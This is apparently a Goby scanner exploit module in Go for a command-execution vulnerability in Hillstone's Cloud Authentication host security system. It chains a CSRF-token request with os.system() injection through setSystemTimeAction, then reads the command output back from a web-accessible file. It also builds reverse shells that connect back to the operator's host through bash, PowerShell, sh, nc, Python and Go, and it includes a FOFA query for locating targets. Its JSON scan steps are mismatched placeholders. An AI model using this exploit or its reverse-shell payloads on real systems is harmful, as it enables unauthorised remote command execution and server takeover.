package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Shanshi Web Technology Cloud Authentication /master/ajaxActions/setSystemTimeAction Command Execution Vulnerability",
    "Description": "<p>Shanshi Web Technology Cloud Authentication Host Security Management System focuses on host detection, response, prevention, and sustainable security operation, achieving full lifecycle management of host security. By implementing measures such as vulnerability detection, east-west micro isolation control, multi fault point risk detection, and multi-level security response on the host, security issues such as host asset management, security reinforcement, east-west traffic protection, real-time threat detection, emergency response, and lost host location can be effectively addressed to help security managers cope with the increasingly severe host risk situation.</p>",
    "Product": "Shanshi Net Science",
    "Homepage": "www.hillstonenet.com.cn",
    "DisclosureDate": "2024-10-14",
    "PostTime": "2024-10-14",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"山石网科版权所有\" && body=\" 山石云鉴主机安全管理系统\"",
    "GobyQuery": "body=\"山石网科版权所有\" && body=\" 山石云鉴主机安全管理系统\"",
    "Level": "2",
    "Impact": "<p>Attackers can execute arbitrary commands and write backdoors on the server by using concatenation, pipeline symbols, wildcard characters, and other bypass methods, thereby invading the server, obtaining server privileges, and directly causing the server to collapse.</p>",
    "Recommendation": "<p>When calling the shell at the code level, escape special characters in the command line (such as |,&amp;amp; amp;,;, etc.) to prevent the execution of other illegal commands.2. Perform whitelist verification or filter using regular expressions based on business logic.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E4%BA%91%E9%89%B4/%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E4%BA%91%E9%89%B4%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "山石网科云鉴 /master/ajaxActions/setSystemTimeAction 命令执行漏洞",
            "Product": "山石网科",
            "Description": "<p>山石网科云鉴主机安全管理系统，围绕主机检测、响应、预防可持续安全运营，实现主机安全全生命周期管理。通过对主机进行脆弱性检测、东西向微隔离管控、多错点风险检测、多层级安全响应等措施，解决主机资产管理、安全加固、东西向流量防护、威胁实时检测、应急响应、失陷主机定位等安全问题，能够有效帮助安全管理人员应对日趋严峻的主机风险态。</p>",
            "Recommendation": "<p>1.在代码级调用shell时，对命令行中的特殊字符（比如|、&amp;amp;amp;amp;、；等）进行转义，防止执行其他非法命令。</p><p>&nbsp;2.根据业务逻辑进行白名单方式校验或使用正则表达式进行过滤。<br></p>",
            "Impact": "<p>攻击者可在服务器通过利用拼接、管道符、通配符等绕过手段来执行任意命令，写入后门，从而入侵服务器，获取服务器权限，直接导致服务器沦陷。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Shanshi Web Technology Cloud Authentication /master/ajaxActions/setSystemTimeAction Command Execution Vulnerability",
            "Product": "Shanshi Net Science",
            "Description": "<p>Shanshi Web Technology Cloud Authentication Host Security Management System focuses on host detection, response, prevention, and sustainable security operation, achieving full lifecycle management of host security. By implementing measures such as vulnerability detection, east-west micro isolation control, multi fault point risk detection, and multi-level security response on the host, security issues such as host asset management, security reinforcement, east-west traffic protection, real-time threat detection, emergency response, and lost host location can be effectively addressed to help security managers cope with the increasingly severe host risk situation.<br></p>",
            "Recommendation": "<p>When calling the shell at the code level, escape special characters in the command line (such as |,&amp;amp; amp;,;, etc.) to prevent the execution of other illegal commands.2. Perform whitelist verification or filter using regular expressions based on business logic.<br></p>",
            "Impact": "<p>Attackers can execute arbitrary commands and write backdoors on the server by using concatenation, pipeline symbols, wildcard characters, and other bypass methods, thereby invading the server, obtaining server privileges, and directly causing the server to collapse.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`

	setPayloadRequestHashzsBjquOv := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
		vulPath := "/master/ajaxActions/getTokenAction.php"
		postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		// 请求头
		head := map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded; charset=UTF-8",
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
			"Accept-Encoding": "gzip, deflate, zstd",
			"Connection":      "keep-alive",
			"Cookie":          "PHPSESSID=emhpeXVhbg;",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		}

		//第二次发包
		vulPath = "/master/ajaxActions/setSystemTimeAction.php?token_csrf=" + strings.ReplaceAll(response.RawBody, "\n", "")
		postRequestConfig2 := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig2.VerifyTls = false
		postRequestConfig2.FollowRedirect = false
		postRequestConfig2.Data = "param=os.system('" + command + "> /opt/var/majorsec/installation/master/runtime/img/config')"
		for headName, headValue := range head {
			postRequestConfig2.Header.Store(headName, headValue)
		}
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig2)
		if err != nil || resp == nil {
			return "", "", err
		}

		//第三次发包
		vulPath2 := "/master/img/config"
		getRequestConfig := httpclient.NewGetRequestConfig(vulPath2)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		response, err = httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := response.RawBody
		return commandResult, "/master/ajaxActions/setSystemTimeAction", nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashzsBjquOv

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.HostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashzsBjquOv

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
